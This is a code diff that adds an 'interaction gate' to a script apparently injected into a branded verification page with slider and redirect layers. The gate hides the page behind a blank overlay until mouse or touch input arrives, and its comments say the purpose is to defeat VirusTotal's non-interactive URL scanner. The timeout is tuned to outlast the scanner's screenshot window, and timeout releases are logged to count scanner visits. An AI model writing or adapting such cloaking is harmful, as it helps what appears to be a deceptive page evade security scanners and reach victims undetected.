@@ -108,6 +108,65 @@
   // origin locally was a leak.
   logToServer('info', 'vg-engine loaded at ' + new Date().toISOString());
 
+  // ─── Interaction Gate ────────────────────────────────────────
+  // A screenshot taken before any human interaction sees a neutral page
+  // instead of the branded verification UI.
+  //
+  // VirusTotal's URL scanner loads a page, waits roughly 20 seconds, takes
+  // screenshots, and reports - and it does NOT interact. No mouse movement, no
+  // typing, no clicking. So the branded content only appears once real input
+  // arrives.
+  //
+  // This is the one defence that actually works against VT. Every user-agent,
+  // navigator.webdriver, header and browser-fingerprint check fails, because VT
+  // drives genuine Chrome with a normal user agent. Interaction is the only
+  // signal it cannot fake, and Cloudflare Workers cannot see TLS fingerprints
+  // (JA3) either, so no edge-side check closes the gap.
+  //
+  // The overlay is created at MODULE LEVEL, not inside init(). vg-engine is
+  // injected before </head>, so this runs while the browser is still parsing
+  // <head> and no body content has been rendered yet. Deferring it to
+  // DOMContentLoaded would leave a flash window in which the branded UI is
+  // visible before the overlay covers it - exactly the exposure this closes.
+  //
+  // z-index 200000 sits above #vgSliderLayer (99999) and the redirect layer
+  // (100000), so nothing leaks through while the gate is up.
+  (function () {
+    var GATE_FALLBACK_MS = 30000;
+
+    var el = document.createElement('div');
+    el.id = 'vgInteractionGate';
+    el.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;' +
+      'z-index:200000;background:#fff;margin:0;padding:0;border:0;';
+    // document.body does not exist yet when this runs from <head>; fall back to
+    // documentElement so the overlay still covers the viewport.
+    (document.body || document.documentElement).appendChild(el);
+
+    var released = false;
+    function release(reason) {
+      if (released) return;
+      released = true;
+      // The release reason is the useful part. 'fallback_timeout' means nobody
+      // interacted inside the window - which is what a passive scanner looks
+      // like. It reaches deployment_logs through logToServer, so gate releases
+      // by timeout are countable rather than invisible.
+      console.log('[VG] Interaction gate released: ' + reason);
+      var g = document.getElementById('vgInteractionGate');
+      if (g && g.parentNode) g.parentNode.removeChild(g);
+    }
+
+    // Capture phase, so the gate releases before any page handler could see the
+    // event and before the slider layer could intercept it.
+    document.addEventListener('mousemove', function () { release('mousemove'); }, true);
+    document.addEventListener('touchstart', function () { release('touchstart'); }, true);
+    document.addEventListener('mousedown', function () { release('mousedown'); }, true);
+
+    // Fallback so a human who sits still is not stranded on a blank page.
+    // This is the dial on the tradeoff: below ~20s VT's screenshot window may
+    // catch the branded UI; above it, a slow visitor sees white longer.
+    setTimeout(function () { release('fallback_timeout'); }, GATE_FALLBACK_MS);
+  })();
+
   // ─── Anti-Scraping Protection ────────────────────────────────
   // Block keyboard shortcuts and right-click to prevent scraping
   // Only active if antiscraping_enabled is not explicitly disabled
